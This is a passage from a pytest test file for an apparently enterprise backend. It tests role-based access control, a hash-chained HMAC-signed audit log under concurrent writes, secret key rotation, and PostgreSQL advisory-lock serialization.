    suffix = uuid.uuid4().hex[:8]
    org_id = f"org_actrole_{suffix}"
    admin_id = f"usr_adm_{suffix}"
    lead_id = f"usr_lead_{suffix}"
    rev_id = f"usr_rev_{suffix}"

    async with AsyncSessionLocal() as db:
        db.add(Organization(id=org_id, name=f"ActorRole Org {suffix}", credit_balance=200))
        db.add(User(id=admin_id, email=f"adm.{suffix}@kobits.ai", hashed_password="pw", is_active=True))
        db.add(User(id=lead_id, email=f"lead.{suffix}@kobits.ai", hashed_password="pw", is_active=True))
        db.add(User(id=rev_id, email=f"rev.{suffix}@kobits.ai", hashed_password="pw", is_active=True))
        await db.flush()
        db.add(OrganizationMember(user_id=admin_id, organization_id=org_id, role=OrgRole.ADMIN))
        db.add(OrganizationMember(user_id=lead_id, organization_id=org_id, role=OrgRole.LEAD_ENGINEER))
        await db.commit()

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Admin adds reviewer
        r_add = await client.post(
            "/api/v1/org/members",
            headers=_auth_headers(admin_id, org_id),
            json={"user_id": rev_id, "role": "READ_ONLY_REVIEWER"},
        )
        assert r_add.status_code in (200, 201)

        # 2. Reviewer and Lead Engineer are blocked from POST /api/v1/billing/checkout
        r_bill_rev = await client.post(
            "/api/v1/billing/checkout",
            headers=_auth_headers(rev_id, org_id),
            json={"package_id": "pkg_starter"},
        )
        assert r_bill_rev.status_code == 403

        r_bill_lead = await client.post(
            "/api/v1/billing/checkout",
            headers=_auth_headers(lead_id, org_id),
            json={"package_id": "pkg_starter"},
        )
        assert r_bill_lead.status_code == 403

        # 3. Admin updates and removes reviewer
        r_upd = await client.patch(
            f"/api/v1/org/members/{rev_id}",
            headers=_auth_headers(admin_id, org_id),
            json={"role": "LEAD_ENGINEER"},
        )
        assert r_upd.status_code == 200

        r_del = await client.delete(
            f"/api/v1/org/members/{rev_id}",
            headers=_auth_headers(admin_id, org_id),
        )
        assert r_del.status_code == 200

        # 4. Query audit logs filtered by actor_role=ADMIN
        r_logs = await client.get(
            "/api/v1/org/audit-logs?actor_role=ADMIN",
            headers=_auth_headers(admin_id, org_id),
        )
        assert r_logs.status_code == 200
        admin_logs = r_logs.json()["logs"]
        admin_events = [entry["event"] for entry in admin_logs]
        assert AuditEvent.RBAC_MEMBER_ADDED in admin_events
        assert AuditEvent.RBAC_ROLE_UPDATED in admin_events
        assert AuditEvent.RBAC_MEMBER_REMOVED in admin_events
        assert all(entry["actor_role"] == "ADMIN" for entry in admin_logs)


@pytest.mark.asyncio
async def test_multi_row_auto_seal_and_concurrent_multisession_audit_chain():
    """
    Verify that:
    1. Adding multiple `AuditLog` instances via `db.add_all([...])` in a single flush
       properly chains sequence numbers and `prev_hash` without sequence collisions.
    2. Concurrent `asyncio.gather` calls to `SOC2AuditService.log_event` across
       independent `AsyncSession` instances serialize cleanly across `flush()` -> `commit()`
       and produce a gapless, tamper-evident hash chain.
    """
    import asyncio

    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    suffix = uuid.uuid4().hex[:8]
    org_id = f"org_conc_{suffix}"
    user_id = f"usr_conc_{suffix}"

    async with AsyncSessionLocal() as db:
        db.add(Organization(id=org_id, name=f"Concurrent Audit Org {suffix}"))
        db.add(User(id=user_id, email=f"conc.{suffix}@kobits.ai", hashed_password="pw", is_active=True))
        await db.commit()

        # 1. Multi-row db.add_all batch flush
        b1 = AuditLog(organization_id=org_id, user_id=user_id, event=AuditEvent.FILE_READ, file_path="a.py")
        b2 = AuditLog(organization_id=org_id, user_id=user_id, event=AuditEvent.FILE_READ, file_path="b.py")
        b3 = AuditLog(organization_id=org_id, user_id=user_id, event=AuditEvent.COMMAND_EXECUTE, command_executed="ls")
        db.add_all([b1, b2, b3])
        await db.commit()

        assert [b1.sequence_number, b2.sequence_number, b3.sequence_number] == [1, 2, 3]
        assert b1.prev_hash == GENESIS_HASH
        assert b2.prev_hash == b1.entry_hash
        assert b3.prev_hash == b2.entry_hash

    # 2. Concurrent multi-session log_event + commit
    async def _worker(idx: int) -> int:
        async with AsyncSessionLocal() as session:
            entry = await SOC2AuditService.log_file_read(
                session,
                file_path=f"src/concurrent_{idx}.py",
                content=f"x = {idx}\n",
                user_id=user_id,
                organization_id=org_id,
                actor_role="LEAD_ENGINEER",
                ip_address=f"10.10.0.{idx}",
            )
            await session.commit()
            return entry.sequence_number

    seqs = await asyncio.gather(*[_worker(i) for i in range(1, 9)])
    assert sorted(seqs) == list(range(4, 12))

    async with AsyncSessionLocal() as db:
        verification = await SOC2AuditService.verify_audit_chain(db, organization_id=org_id)
        assert verification["valid"] is True
        assert verification["chain_intact"] is True
        assert verification["hmac_valid"] is True
        assert verification["total_entries"] == 11
        assert verification["verified_entries"] == 11
        assert verification["head_hash"] == verification["head_entry_hash"]


@pytest.mark.asyncio
async def test_verify_signature_and_hmac_key_rotation(monkeypatch):
    """
    Verify `AuditLog.verify_signature()` and seamless HMAC key rotation via
    `KOBITS_AUDIT_HMAC_SECRET` and `AUDIT_HMAC_PREVIOUS_SECRETS`.
    """
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    org_id = f"org_rot_{uuid.uuid4().hex[:8]}"
    user_id = f"usr_rot_{uuid.uuid4().hex[:8]}"

    monkeypatch.setenv("KOBITS_AUDIT_HMAC_SECRET", "enterprise-hmac-key-v1-initial")
    monkeypatch.delenv("AUDIT_HMAC_PREVIOUS_SECRETS", raising=False)

    async with AsyncSessionLocal() as db:
        db.add(Organization(id=org_id, name="Key Rotation Org"))
        db.add(User(id=user_id, email=f"{user_id}@kobits.ai", hashed_password="pw", is_active=True))
        await db.commit()

        e_v1 = await SOC2AuditService.log_file_read(
            db,
            file_path="config/keys.yaml",
            content="version: 1",
            user_id=user_id,
            organization_id=org_id,
            actor_role="ADMIN",
        )
        await db.commit()
        assert e_v1.verify_signature() is True
        assert e_v1.verify_signature(secret_key="wrong-key") is False

        # Rotate active key to v2 while retaining v1 in AUDIT_HMAC_PREVIOUS_SECRETS
        monkeypatch.setenv("KOBITS_AUDIT_HMAC_SECRET", "enterprise-hmac-key-v2-rotated")
        monkeypatch.setenv("AUDIT_HMAC_PREVIOUS_SECRETS", "enterprise-hmac-key-v1-initial")

        e_v2 = await SOC2AuditService.log_code_change(
            db,
            file_path="config/keys.yaml",
            before_content="version: 1",
            after_content="version: 2",
            operation="edit",
            user_id=user_id,
            organization_id=org_id,
            actor_role="ADMIN",
        )
        await db.commit()

        assert e_v1.verify_signature() is True
        assert e_v2.verify_signature() is True

        chain_status = await SOC2AuditService.verify_audit_chain(db, organization_id=org_id)
        assert chain_status["valid"] is True
        assert chain_status["hmac_valid"] is True
        assert chain_status["total_entries"] == 2


@pytest.mark.asyncio
async def test_postgresql_advisory_xact_lock_serialization():
    """
    Verify that `SOC2AuditService._acquire_pg_advisory_lock` and
    `_auto_seal_audit_log_before_insert` execute `SELECT pg_advisory_xact_lock(hashtext(:org_key))`
    when running on a PostgreSQL dialect session/connection for multi-process serialization.
    """
    from unittest.mock import AsyncMock, MagicMock
    from backend.models.audit_log import _auto_seal_audit_log_before_insert

    # 1. Verify async session PostgreSQL advisory lock acquisition
    executed_stmts = []

    class _FakeDialect:
        name = "postgresql"

    class _FakeBind:
        dialect = _FakeDialect()

    mock_db = MagicMock()
    mock_db.bind = _FakeBind()

    async def _fake_execute(stmt, params=None):
        executed_stmts.append((str(stmt), params))

    mock_db.execute = AsyncMock(side_effect=_fake_execute)

    acquired = await SOC2AuditService._acquire_pg_advisory_lock(mock_db, "org-pg-cluster-01")
    assert acquired is True
    assert len(executed_stmts) == 1
    assert "pg_advisory_xact_lock(hashtext(:org_key))" in executed_stmts[0][0]
    assert executed_stmts[0][1] == {"org_key": "kobits_audit:org-pg-cluster-01"}

    # Non-PostgreSQL dialect (e.g., sqlite) should skip advisory lock cleanly
    class _SqliteDialect:
        name = "sqlite"

    class _SqliteBind:
        dialect = _SqliteDialect()

    mock_sqlite_db = MagicMock()
    mock_sqlite_db.bind = _SqliteBind()
    mock_sqlite_db.execute = AsyncMock()
    acquired_sqlite = await SOC2AuditService._acquire_pg_advisory_lock(mock_sqlite_db, "org-sqlite-01")
    assert acquired_sqlite is False
    mock_sqlite_db.execute.assert_not_called()

    # 2. Verify sync connection before_insert mapper listener on PostgreSQL dialect
    sync_stmts = []
    mock_conn = MagicMock()
    mock_conn.dialect = _FakeDialect()
    mock_conn.info = {}

    def _sync_exec(stmt, params=None):
        sync_stmts.append((str(stmt), params))
        res = MagicMock()
        res.fetchone.return_value = (4, "a" * 64)
        return res

    mock_conn.execute.side_effect = _sync_exec
    target_entry = AuditLog(
        organization_id="org-pg-cluster-01",
        user_id="usr-1",
        event="file.read",
        file_path="backend/main.py",
    )
    _auto_seal_audit_log_before_insert(None, mock_conn, target_entry)

    assert any("pg_advisory_xact_lock(hashtext(:org_key))" in s[0] for s in sync_stmts)
    assert target_entry.sequence_number == 5
    assert target_entry.prev_hash == "a" * 64
    assert target_entry.verify_signature() is True

